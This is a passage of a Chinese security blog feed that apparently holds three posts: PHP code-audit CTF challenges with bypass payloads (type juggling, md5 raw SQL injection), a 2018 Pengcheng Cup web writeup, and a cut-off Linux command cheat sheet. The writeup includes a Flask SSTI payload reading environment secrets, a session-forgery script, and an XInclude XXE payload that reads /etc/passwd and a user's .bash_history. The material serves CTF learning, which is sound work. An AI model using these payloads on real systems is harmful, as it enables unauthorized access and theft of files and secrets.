  else{        echo &quot;flag{**************************}&quot;;    }}?&gt;</code></pre><blockquote><p>1024.1绕过</p></blockquote><h1 id="0x09-md5-函数-使用数组绕过"><a href="#0x09-md5-函数-使用数组绕过" class="headerlink" title="0x09 md5()函数===使用数组绕过"></a>0x09 md5()函数===使用数组绕过</h1><pre><code>&lt;?phperror_reporting(0);$flag = &#39;flag{test}&#39;;if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;])) {    if ($_GET[&#39;username&#39;] == $_GET[&#39;password&#39;])        print &#39;Your password can not be your username.&#39;;    else if (md5($_GET[&#39;username&#39;]) === md5($_GET[&#39;password&#39;]))        die(&#39;Flag: &#39;.$flag);    else        print &#39;Invalid password&#39;;}?&gt;</code></pre><blockquote><p>?username[]=1&amp;password[]=2</p></blockquote><h1 id="0x10-十六进制与数字比较"><a href="#0x10-十六进制与数字比较" class="headerlink" title="0x10 十六进制与数字比较"></a>0x10 十六进制与数字比较</h1><pre><code>&lt;?phperror_reporting(0);function noother_says_correct($temp){    $flag = &#39;flag{test}&#39;;    $one = ord(&#39;1&#39;);  //ord — 返回字符的 ASCII 码值    $nine = ord(&#39;9&#39;); //ord — 返回字符的 ASCII 码值    $number = &#39;3735929054&#39;;    // Check all the input characters!    for ($i = 0; $i &lt; strlen($number); $i++)    {         // Disallow all the digits!        $digit = ord($temp{$i});        if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )        {            // Aha, digit not allowed!            return &quot;flase&quot;;        }    }    if($number == $temp)        echo $flag;        return $flag;}$temp = $_GET[&#39;password&#39;];echo noother_says_correct($temp);?&gt;</code></pre><blockquote><p>?password=0xdeadc0de<br>3735929054 == 0xdeadc0de（十六进制）</p></blockquote><h1 id="0x11-数字验证正则绕过"><a href="#0x11-数字验证正则绕过" class="headerlink" title="0x11 数字验证正则绕过"></a>0x11 数字验证正则绕过</h1><pre><code>&lt;?phperror_reporting(0);$flag = &#39;flag{test}&#39;;if  (&quot;POST&quot; == $_SERVER[&#39;REQUEST_METHOD&#39;]) {     $password = $_POST[&#39;password&#39;];     if (0 &gt;= preg_match(&#39;/^[[:graph:]]{12,}$/&#39;, $password)) //preg_match — 执行一个正则表达式匹配, 意为必须是12个字符以上（非空格非TAB之外的内容）    {         echo &#39;Wrong Format&#39;;         exit;     }     while (TRUE)     {         $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;;         if (6 &gt; preg_match_all($reg, $password, $arr)) //意为匹配到的次数要大于6次//字符串中，把连续的大写，小写，数字，符号作为一段，至少分六段，例如a12SD+io8可以分成a 12 SD + io 8六段            break;         $c = 0;         $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母         foreach ($ps as $pt)         {             if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))                 $c += 1;         }         if ($c &lt; 3) break;         //&gt;=3，意为必须要有大小写字母，数字，字符内容三种与三种以上        if (&quot;42&quot; == $password) echo $flag; //意为必须等于42        else echo &#39;Wrong password&#39;;         exit;     } }?&gt;</code></pre><blockquote><p>password=42.00e+00000000000 或 password=420.000000000e-1</p></blockquote><h1 id="0x12-弱类型整数大小比较绕过"><a href="#0x12-弱类型整数大小比较绕过" class="headerlink" title="0x12 弱类型整数大小比较绕过"></a>0x12 弱类型整数大小比较绕过</h1><pre><code>&lt;?phperror_reporting(0);$flag = &quot;flag{test}&quot;;$temp = $_GET[&#39;password&#39;];is_numeric($temp)?die(&quot;no numeric&quot;):NULL;    if($temp&gt;1336){    echo $flag;} ?&gt;</code></pre><blockquote><p>?password=1337a<br>当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。<br>当输入1337a，在is_numeric中返回true，然后在比较时被转换成数字1337。</p></blockquote><h1 id="0x13-md5函数true绕过注入"><a href="#0x13-md5函数true绕过注入" class="headerlink" title="0x13 md5函数true绕过注入"></a>0x13 md5函数true绕过注入</h1><pre><code>&lt;?php error_reporting(0);$link = mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;);if (!$link) {   die(&#39;Could not connect to MySQL: &#39; . mysql_error()); } // 选择数据库$db = mysql_select_db(&quot;security&quot;, $link);if(!$db){  echo &#39;select db error&#39;;  exit();}// 执行sql$password = $_GET[&#39;password&#39;];$sql = &quot;SELECT * FROM users WHERE password = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;var_dump($sql);$result=mysql_query($sql) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );$row1 = mysql_fetch_row($result);var_dump($row1);mysql_close($link);?&gt;</code></pre><blockquote><p>?password=ffifdyop<br>只需md5($password,true)包含’ or ‘xxx这样的字符即可绕过，SQL即变成：<br>SELECT * FROM admin WHERE pass = ‘’ or ‘xxx’<br>字符串<code>ffifdyop</code>，md5后为276f722736c95d99e921722cf9ed621c，hex转换为字符串为：<code>&#39;or&#39;6&lt;trash&gt;</code></p></blockquote><h1 id="0x14-switch没有break-字符与0比较绕过"><a href="#0x14-switch没有break-字符与0比较绕过" class="headerlink" title="0x14 switch没有break 字符与0比较绕过"></a>0x14 switch没有break 字符与0比较绕过</h1><pre><code>&lt;?php//$flag = &#39;flag{***************}&#39;;error_reporting(0);if (isset($_GET[&#39;which&#39;])){    $which = $_GET[&#39;which&#39;];    switch ($which)    {    case 0:        echo 111;        //break;    case 1:    case 2:        require_once $which.&#39;.php&#39;;        echo $flag;        break;    default:        echo GWF_HTML::error(&#39;PHP-0817&#39;, &#39;Hacker NoNoNo!&#39;, false);        break;    }}?&gt;</code></pre><blockquote><p>?which=flag<br>这里在case 0 和 case 1的时候均没有break，按照常规思维，应该是0比较不成功，进入比较1，然后比较2，再然后进入default。<br>但实际上，在case 0比较的时候，是相等的。进入了case 0的方法体，但是却没有break，这个时候，默认判断已经比较成功了，而如果匹配成功之后，会继续执行后面的语句。当我们传入flag时，case 0比较进入了方法体，但是没有break，默认已经匹配成功，往下执行不再判断，进入2的时候，执行了require_once flag.php<br><img src="https://upload-images.jianshu.io/upload_images/6934571-b396e9187a8367db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br><img src="https://upload-images.jianshu.io/upload_images/6934571-b3f416f7abb10ac8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br><img src="https://upload-images.jianshu.io/upload_images/6934571-8b4ad23d706fad82.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p></blockquote><blockquote><p>在php中，非数字开头的字符串与数字0的弱类型比较（==）均返回true。<br>而以数字开头的字符串进行比较时，可转换为数字。<br>eg：7asd可转换为7</p></blockquote><h1 id="0x15-利用提交数组绕过逻辑"><a href="#0x15-利用提交数组绕过逻辑" class="headerlink" title="0x15 利用提交数组绕过逻辑"></a>0x15 利用提交数组绕过逻辑</h1><pre><code>&lt;?php $role = &quot;guest&quot;;$flag = &quot;flag{test_flag}&quot;;$auth = false;if(isset($_COOKIE[&quot;role&quot;])){    $role = unserialize(base64_decode($_COOKIE[&quot;role&quot;]));    if($role === &quot;admin&quot;){        $auth = true;    }    else{        $auth = false;    }}else{    $role = base64_encode(serialize($role));    setcookie(&#39;role&#39;,$role);}if($auth){    if(isset($_POST[&#39;filename&#39;])){        $filename = $_POST[&#39;filename&#39;];        $data = $_POST[&#39;data&#39;];        if(preg_match(&#39;[&lt;&gt;?]&#39;, $data)) {            die(&#39;No No No!&#39;.$data);        }        else {            $s = implode($data);//implode() 函数返回由数组元素组合成的字符串。            if(!preg_match(&#39;[&lt;&gt;?]&#39;, $s)){                $flag=&#39;None.&#39;;            }            $rand = rand(1,10000000);            $tmp=&quot;./uploads/&quot;.md5(time() + $rand).$filename;            file_put_contents($tmp, $flag);            echo &quot;your file is in &quot; . $tmp;        }    }    else{        echo &quot;Hello admin, now you can upload something you are easy to forget.&quot;;        echo &quot;&lt;br /&gt;there are the source.&lt;br /&gt;&quot;;        echo &#39;&lt;textarea rows=&quot;10&quot; cols=&quot;100&quot;&gt;&#39;;        echo htmlspecialchars(str_replace($flag,&#39;flag{???}&#39;,file_get_contents(__FILE__)));        echo &#39;&lt;/textarea&gt;&#39;;    }}else{    echo &quot;Sorry. You have no permissions.&quot;;}?&gt;</code></pre><blockquote><ul><li>修改cookie中role为czo1OiJhZG1pbiI7令$auth为true</li><li>以<code>data[0]=123&amp;data[1]=&lt;&gt;</code> 的形式传入数组<br><code>preg_match(&#39;[&lt;&gt;?]&#39;, $data)</code>匹配数组，结果返回false；<br><code>preg_match(&#39;[&lt;&gt;?]&#39;, $s)</code>匹配字符串，结果返回true。</li></ul></blockquote><h1 id="0x16"><a href="#0x16" class="headerlink" title="0x16"></a>0x16</h1><pre><code>&lt;?phperror_reporting(0);echo &quot;&lt;!--index.phps--&gt;&quot;;if(!$_GET[&#39;id&#39;]){header(&#39;Location: index.php?id=1&#39;);exit();}$id=$_GET[&#39;id&#39;];$a=$_GET[&#39;a&#39;];$b=$_GET[&#39;b&#39;];if(stripos($a,&#39;.&#39;)){echo &#39;Hahahahahaha&#39;;return ;}$data = @file_get_contents($a,&#39;r&#39;);if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4){require(&quot;flag.txt&quot;);}else{print &quot;work harder!harder!harder!&quot;;}?&gt;</code></pre><blockquote><p>?a=data:,1112 is a nice lab!&amp;id=0e12&amp;b=%00412311</p><ul><li><code>$data==&quot;1112 is a nice lab!&quot;</code><br>利用远程文件包含在allow_url_include开启时可以使用，但发现对$a有了.过滤所以还是data协议比较稳妥，参考<a href="http://blog.csdn.net/lxgwm2008/article/details/38437875" target="_blank" rel="noopener">这里</a><br>data:,&lt;文本数据&gt;<br>data:text/plain,&lt;文本数据&gt;<br>data:text/html,&lt;HTML代码&gt;<br>data:text/html;base64,&lt;base64编码的HTML代码&gt;<br>data:text/css,&lt;CSS代码&gt;<br>data:text/css;base64,&lt;base64编码的CSS代码&gt;<br>data:text/javascript,&lt;Javascript代码&gt;<br>data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;<br>data:image/gif;base64,base64编码的gif图片数据<br>data:image/png;base64,base64编码的png图片数据<br>data:image/jpeg;base64,base64编码的jpeg图片数据<br>data:image/x-icon;base64,base64编码的icon图片数据</li><li><code>$id==0</code><br>典型的PHP弱比较可参考<a href="http://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="noopener">这里</a></li><li><code>strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</code><br>strlen函数对%00不截断但substr截断<br>ereg函数对%00截断及遇到%00则默认为字符串的结束</li></ul></blockquote><h1 id="0x17"><a href="#0x17" class="headerlink" title="0x17"></a>0x17</h1><pre><code>&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__file__);if(isset($_GET[&#39;args&#39;])){    $args = $_GET[&#39;args&#39;];    if(!preg_match(&quot;/^\w+$/&quot;,$args)){        die(&quot;args error!&quot;);    }    eval(&quot;var_dump($$args);&quot;);//这里涉及超全局变量的使用}?&gt;</code></pre><blockquote><p>?args=GLOBALS</p></blockquote><h1 id="0x18"><a href="#0x18" class="headerlink" title="0x18"></a>0x18</h1><pre><code>&lt;?phpshow_source(__FILE__);$a=0;$b=0;$c=0;$d=0;if (isset($_GET[&#39;x1&#39;])){    $x1 = $_GET[&#39;x1&#39;];    $x1==&quot;1&quot;?die(&quot;ha?&quot;):NULL;    switch ($x1)    {        case 0:        case 1:            $a=1;            break;    }}$x2=(array)json_decode(@$_GET[&#39;x2&#39;]);if(is_array($x2)){    is_numeric(@$x2[&quot;x21&quot;])?die(&quot;ha?&quot;):NULL;    if(@$x2[&quot;x21&quot;]){        ($x2[&quot;x21&quot;]&gt;2017)?$b=1:NULL;    }    if(is_array(@$x2[&quot;x22&quot;])){        if(count($x2[&quot;x22&quot;])!==2 OR !is_array($x2[&quot;x22&quot;][0])) die(&quot;ha?&quot;);        $p = array_search(&quot;XIPU&quot;, $x2[&quot;x22&quot;]);        $p===false?die(&quot;ha?&quot;):NULL;        foreach($x2[&quot;x22&quot;] as $key=&gt;$val){            $val===&quot;XIPU&quot;?die(&quot;ha?&quot;):NULL;        }        $c=1;    }}$x3 = $_GET[&#39;x3&#39;];if ($x3 != &#39;15562&#39;) {    if (strstr($x3, &#39;XIPU&#39;)) {        if (substr(md5($x3),8,16) == substr(md5(&#39;15562&#39;),8,16)) {            $d=1;        }    }}if($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d){    include &quot;flag.php&quot;;    echo $flag;}?&gt;</code></pre><blockquote><p><code>?x1=1a&amp;x2={&quot;x21&quot;:&quot;2018e&quot;,&quot;x22&quot;:[[&quot;XIPU&quot;],0]}&amp;x3=47484XIPU</code></p><ul><li>x1=1a 或 0</li><li>x3位md5弱类型比较</li></ul></blockquote><pre><code>import reimport hashlibmd = hashlib.md5(&quot;15562&quot;.encode())s = md.hexdigest()[8:8+16]print(&#39;md5(15562) =&#39;,s)for i in range(10000000):   #md = hashlib.md5((&#39;XIPU&#39;+str(i)).encode())   md = hashlib.md5((str(i) + &#39;XIPU&#39;).encode())   x = md.hexdigest()[8:8+16]   if re.findall(&#39;^0e\d*$&#39;,x):      print(str(i) + &#39;XIPU&#39;)      print(x)</code></pre><h1 id="0x19"><a href="#0x19" class="headerlink" title="0x19"></a>0x19</h1><pre><code>&lt;?phpif (isset($_POST[&#39;message&#39;])) {    $message = json_decode($_POST[&#39;message&#39;]);    $key =&quot;*********&quot;;    if ($message-&gt;key == $key) {        echo &quot;flag&quot;;    }    else {        echo &quot;fail&quot;;    }}else{    echo &quot;~~~~&quot;;}</code></pre><blockquote><p>message={“key”:true}<br><img src="https://upload-images.jianshu.io/upload_images/6934571-4d23ffb2373a21a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p></blockquote><h1 id="0x20"><a href="#0x20" class="headerlink" title="0x20"></a>0x20</h1><pre><code>&lt;?phperror_reporting(0);if (empty($_GET[&#39;b&#39;])) {    show_source(__FILE__);    die();}else{    include(&#39;flag.php&#39;);$a = &quot;www.XMAN.com&quot;;$b = $_GET[&#39;b&#39;];@parse_str($b);if ($a[0] != &#39;QNKCDZO&#39; &amp;&amp; md5($a[0]) == md5(&#39;QNKCDZO&#39;)) {    echo $flag;}else{exit(&#39;你的答案不对0.0&#39;);}}?&gt;</code></pre><blockquote><p>?b=a[0]=s878926199a</p></blockquote><h1 id="0x21"><a href="#0x21" class="headerlink" title="0x21"></a>0x21</h1><pre><code>&lt;?phpif(isset($_POST[&#39;login&#39;])){    if(isset($_POST[&#39;user&#39;]))    {        if(@strcmp($_POST[&#39;user&#39;],$USER))//USER是被隐藏的复杂用户名        {            die(&#39;user错误！&#39;);        }    }    if (isset($_POST[&#39;name&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;]))    {        if ($_POST[&#39;name&#39;] == $_POST[&#39;password&#39;] )        {            die(&#39;账号密码不能一致！&#39;);        }        if (md5($_POST[&#39;name&#39;]) === md5($_POST[&#39;password&#39;]))        {            if(is_numeric($_POST[&#39;id&#39;])&amp;&amp;$_POST[&#39;id&#39;]!==&#39;72&#39; &amp;&amp; !preg_match(&#39;/\s/&#39;, $_POST[&#39;id&#39;]))            {                if($_POST[&#39;id&#39;]==72)                    die(&quot;flag...&quot;);                else                    die(&quot;ID错误2！&quot;);            }            else            {                die(&quot;ID错误1！&quot;);            }        }        else            die(&#39;账号密码错误！&#39;);    }}</code></pre><blockquote><p>user[]=1&amp;name[]=1&amp;password[]=2&amp;id=72.0&amp;login=Check<br>or<br>user[]=1&amp;name[]=1&amp;password[]=2&amp;id=072&amp;login=Check</p></blockquote><p><a href="https://github.com/bowu678/php_bugs" target="_blank" rel="noopener">源项目地址</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>“鹏城杯”2018部分web wp</title>
      <link href="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/"/>
      <url>/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="myblog"><a href="#myblog" class="headerlink" title="myblog"></a>myblog</h1><blockquote><p>十足的脑洞题！=-=<br>访问index.php响应头中发现提示信息：<code>?flag</code><br><img src="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/image-20200503114437602.png" alt><br>php://filter实现文件读取<br>php://filter/convert.base64-encode/resource=index获得index.php源码。</p></blockquote><pre><code>&lt;?php     header(&#39;flag: JTNGZmxhZw==&#39;);    if(isset($_GET[&quot;flag&quot;])){        $flag = $_GET[&quot;flag&quot;];        include $flag.&quot;.php&quot;;    }?&gt;</code></pre><blockquote><p>rbl=-=<br>题目一直给的提示也是云里雾里<br>about，base64编码–&gt;YWJvdXQ=<br>访问<a href="http://58.20.46.150:26293/YWJvdXQ=.php" target="_blank" rel="noopener">http://58.20.46.150:26293/YWJvdXQ=.php</a> 200！！！<br>读源码：</p></blockquote><pre><code>&lt;?php    $filename = &#39;flag.txt&#39;;    $flag = &#39;flag.txt&#39;;    extract($_GET);    if(isset($sign)){        $file = trim(file_get_contents($filename));        if($sign === $file){            echo &#39;Congratulation!&lt;br&gt;&#39;;            echo file_get_contents($$falg);        }        else{            echo &#39;don`t give up&#39;;        }    }?&gt;</code></pre><blockquote><p>变量覆盖,获取flag<br><img src="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/image-20200503114455941.png" alt></p></blockquote><h1 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h1><blockquote><ul><li>提示信息：flask,/upload<br>访问upload提示需要admin登录<br>尝试flask ssti<br><img src="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/image-20200503114621417.png" alt><br>思路目前已经比较明确了<br>利用ssti读取secretkey伪造session，让自身变为admin访问/upload</li></ul></blockquote><blockquote><ul><li>ssti利用<br>参考文章：<a href="http://shaobaobaoer.cn/archives/665/tokyo-westerns-ctf-2018-web-wp" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/665/tokyo-westerns-ctf-2018-web-wp</a><ul><li>没有 WAF 的情况<br>config：<code></code><br>self：<code></code><br>()：只要找一个有 os 的 subclasses</li></ul></li></ul></blockquote><pre><code>().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#39;__import__&#39;](&quot;os&quot;).__dict__.environ[&#39;FLAG&#39;]().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).__dict__.environ[&#39;FLAG&#39;]## 作者给的; &lt;type &#39;dict_keys&#39;&gt; 里本身就有 OS[].__class__.__base__.__subclasses__()[68].__init__.__globals__[&#39;os&#39;].__dict__.environ[&#39;FLAG&#39;]</code></pre><blockquote><ul><li>当config,self,( ) 都被过滤的时候，为了去获得讯息，必须去读一些全局变量。<br>比如：current_app<br><code>__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]</code><br><code>top.app.config[&#39;FLAG&#39;]</code></li></ul></blockquote><blockquote><p>如何绕过waf ? url_for 调取 current_app<br>首先，介绍一个很牛逼的函数，叫做url_for,可以参考flask的官方文档 <a href="http://flask.pocoo.org/docs/1.0/api/#flask.url_forbaobaoer.cn/archives/656/python-b2e7b180e9b880e793" target="_blank" rel="noopener">flask.url_for</a><br>在它引用的内容中，有着 current_app 的全局变量</p></blockquote><blockquote><p>如何绕过waf ? get_flashed_messages 调取 current_app<br>除此之外，还有函数包含了 current_app ，叫做 get_flashed_messages ，同样，可以参考官方文档 <a href="http://flask.pocoo.org/docs/1.0/api/#flask.get_flashed_messages" target="_blank" rel="noopener">flask.get_flashed_messages</a></p></blockquote><p>因此本题通过访问<br><code>http://58.20.46.150:25524/</code><br>成功获取secretkey：<code>as/*d21as-+dhasod5a4s54:&gt;&lt;*()dfdsf</code></p><blockquote><ul><li>之后我们就可以开始伪造session<br>参考文章：<a href="https://s0cket7.com/picoctf-web/" target="_blank" rel="noopener">https://s0cket7.com/picoctf-web/</a><br>注册一个账号并登陆<br>将session 解码之后：<br><code>{u&#39;csrf_token&#39;: &#39;0c571097c78ee172ee45dc8040bfc51a8097bb5f&#39;, u&#39;user_id&#39;: u&#39;174&#39;, u&#39;name&#39;: u&#39;shy&#39;, u&#39;_fresh&#39;: True, u&#39;is_admin&#39;: False, u&#39;_id&#39;: &#39;03ecc0c802a927210d305104e208baf9d9ca3e66c0e8a30ac70d0acf8a8e8be3cba606a3589426385324a67ad8824715cfc97260e3be80e11d894a01fb92d498&#39;}</code><br>目的是伪造成admin，因此重构session如下：<br><code>{u&#39;csrf_token&#39;: &#39;0c571097c78ee172ee45dc8040bfc51a8097bb5f&#39;, u&#39;user_id&#39;: u&#39;174&#39;, u&#39;name&#39;: u&#39;admin&#39;, u&#39;_fresh&#39;: True, u&#39;is_admin&#39;: u&#39;True&#39;, u&#39;_id&#39;: &#39;03ecc0c802a927210d305104e208baf9d9ca3e66c0e8a30ac70d0acf8a8e8be3cba606a3589426385324a67ad8824715cfc97260e3be80e11d894a01fb92d498&#39;}</code><br>重新编码之后为：<br><code>.eJxFkEGLwjAUhP_K8s49NLWyIHiwpCsVXoKQVZJL0VqbNokLrZI14n_frHvY0_CGeR_MPKA-j-2kYXEdb20CdX-CxQPejrAApMzKDL0MnUdXznFo7igKg2FFUKxSJSrP1xutBmv4nmnMPjPm0CuhNYZCy9B4RaNmMpdC25i1mLFeCumZKwMT3ZzRKsPQEQxVGv2Z3G9zTquUhZLITA1cNHc2FPFvYzmNKj4MpyZmV9_KVXN025SLbgnPBJppPNfXL9Ne_iuskUSU5-I0sKCtEuUM3c4yujO_tRgteuWQ4L7MkZqZdBVR3fKF66f6cHJ9hIGI20ACl4Nr4_XnJnCb2vG1F5D3HJ4_ROJrEQ.XANE-Q.9uWmYKvMMY_5eYLIeKbhSicbLRk</code><br>替换cookie，访问/upload成功</li></ul></blockquote><p>脚本如下：</p><pre><code>from flask.sessions import SecureCookieSessionInterfacefrom itsdangerous import URLSafeTimedSerializerimport sysclass CookieSessionInterface(SecureCookieSessionInterface):  def __init__(self, secret_key):    self.secret_key = secret_key    if not secret_key:      return None    signer_kwargs = dict(      key_derivation=self.key_derivation,      digest_method=self.digest_method    )    self.sign_serializer = URLSafeTimedSerializer(secret_key, salt=self.salt,                                  serializer=self.serializer,                                  signer_kwargs=signer_kwargs)  def decode(self, cookie):    return self.sign_serializer.loads(cookie)  def encode(self, cookie):    return self.sign_serializer.dumps(cookie)if __name__==&#39;__main__&#39;:    secret = &#39;as/*d21as-+dhasod5a4s54:&gt;&lt;*()dfdsf&#39;    cookie = sys.argv[1]    csi = CookieSessionInterface(secret)    decoded_cookie = csi.decode(cookie)    print &quot;* ORIGINAL COOKIE:&quot;, decoded_cookie    decoded_cookie[&#39;is_admin&#39;] = u&quot;True&quot;    decoded_cookie[&#39;name&#39;] = u&quot;admin&quot;    print &quot;* MODIFIED COOKIE&quot;, decoded_cookie    new_cookie = csi.encode(decoded_cookie)    print &quot;+ MODIFIED SECRET ENCODED COOKIE:&quot;, new_cookie</code></pre><blockquote><ul><li>/upload为一个上传页面，随意上传文件500=-=<br>迷……<br>然后发现<br><img src="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/image-20200503114652410.png" alt>))</li></ul></blockquote><blockquote><ul><li>尝试xxe，测试发现禁用了<code>&lt;!ENTITY</code>，<code>&lt;!DOCTYPE</code><br><img src="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/image-20200503114708041.png" alt><br>搜索了一波xxe payload，测试发现可以用xinclude<br>payload:</li></ul></blockquote><pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt; &lt;xi:include href=&quot;file:///etc/passwd&quot; parse=&quot;text&quot;/&gt;&lt;/root&gt;</code></pre><blockquote><p><img src="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/image-20200503114733257.png" alt><br>不能列目录，有点懵~<br>发现其中有一个rq用户比较可疑<br>尝试读取/home/rq/.bash_history<br><img src="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/image-20200503114755730.png" alt><br>读取flag<br><img src="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/image-20200503114813276.png" alt></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> flask ssti </tag>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux tips</title>
      <link href="/2018/11/26/linux-tips/"/>
      <url>/2018/11/26/linux-tips/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux下查看文件内容的命令"><a href="#Linux下查看文件内容的命令" class="headerlink" title="Linux下查看文件内容的命令"></a>Linux下查看文件内容的命令</h1><blockquote><p>查看文件内容的命令：<br>cat     由第一行开始显示内容，并将所有内容输出<br>tac     从最后一行倒序显示内容，并将所有内容输出<br>more    根据窗口大小，一页一页的现实文件内容<br>less    和more类似，但其优点可以往前翻页，而且进行可以搜索字符<br>head    只显示头几行<br>tail    只显示最后几行<br>nl      类似于cat -n，显示时输出行号<br>tailf   类似于tail -f<br>##ssh<br>ssh &lt;-p 端口&gt; 用户名@IP</p></blockquote><h1 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h1><blockquote><p>scp 文件路径  用户名@IP:存放路径　<br>从本地服务器复制到远程服务器：<br>(1) 复制文件：<br>命令格式：<br>scp local_file remote_username@remote_ip:remote_folder<br>或者<br>scp local_file remote_username@remote_ip:remote_file<br>或者<br>scp local_file remote_ip:remote_folder<br>或者<br>scp local_file remote_ip:remote_file<br>第1,2个指定了用户名，命令执行后需要输入用户密码，第1个仅指定了远程的目录，文件名字不变，第2个指定了文件名<br>第3,4个没有指定用户名，命令执行后需要输入用户名和密码，第3个仅指定了远程的目录，文件名字不变，第4个指定了文件名<br>(2) 复制目录：<br>命令格式：<br>scp -r local_folder remote_username@remote_ip:remote_folder<br>或者<br>scp -r local_folder remote_ip:remote_folder<br>第1个指定了用户名，命令执行后需要输入用户密码；<br>第2个没有指定用户名，命令执行后需要输入用户名和密码；</p></blockquote><h1 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h1><blockquote><p>tar –xvf file.tar         // 解压 tar包<br>tar -zxvf file.tar.gz     // 解压tar.gz<br>tar -jxvf file.tar.bz2    // 解压 tar.bz2<br>tar –Zxvf file.tar.Z      // 解压tar.Z  </p></blockquote><blockquote><p>tar –cvf jpg.tar *.jpg     // 将目录里所有jpg文件打包成tar.jpg<br>tar –czf jpg.tar.gz *.jpg  // 将目录里所有jpg文件打包成jpg.tar后，并且将其用gzip压缩，生成一个gzip压缩过的包，命名为jpg.tar.gz<br>tar –cjf jpg.tar.bz2 *.jpg // 将目录里所有jpg文件打包成jpg.tar后，并且将其用bzip2压缩，生成一个bzip2压缩过的包，命名为jpg.tar.bz2<br>tar –cZf jpg.tar.Z *.jpg   // 将目录里所有jpg文件打包成jpg.tar后，并且将其用compress压缩，生成一个umcompress压缩过的包，命名为jpg.tar.Z  </p></blockquote><h1 id="w"><a href="#w" class="headerlink" title="w"></a>w</h1><blockquote><p>w命令–&gt;用来查看登录者的信息及他们的行为。<br>User：登录用户名<br>TTY：登录后系统分配的终端号<br>From：远程主机名，即从哪登录的<br>login@：何时登录<br>IDLE：用户空闲时间。这是个计时器，一旦用户执行任何操作，改计时器就会被重置。<br>JCPU：和终端连接的所有进程占用时间。包括当前正在运行的后台作业占用时间<br>PCPU：当前进程所占用时间<br>WHAT：当前正在运行进程的命令行</p></blockquote><blockquote><p>与其他命令比较</p><p>1) 区别于who命令，w命令不仅可以看到登录服务器的用户信息，而且可以看到这些用户做了什么<br>2) who am i命令，显示出自己在系统中的用户名，登录终端，登录时间<br>3) whoami命令，显示自己在系统中的用户名<br>4) logname命令，可以显示自己初次登录到系统中的用户名，主要识别sudo前后情形<br>5) last命令，查看最近1个月用户登录服务器的情况<br>6) tty命令，来查看所连接的设备或终端</p></blockquote><h1 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h1><blockquote><p>列出所有端口 netstat -a<br>列出所有 tcp 端口 netstat -at<br>列出所有 udp 端口 netstat -au<br>只显示监听端口 netstat -l<br>只列出所有监听 tcp 端口 netstat -lt<br>只列出所有监听 udp 端口 netstat -lu<br>只列出所有监听 UNIX 端口 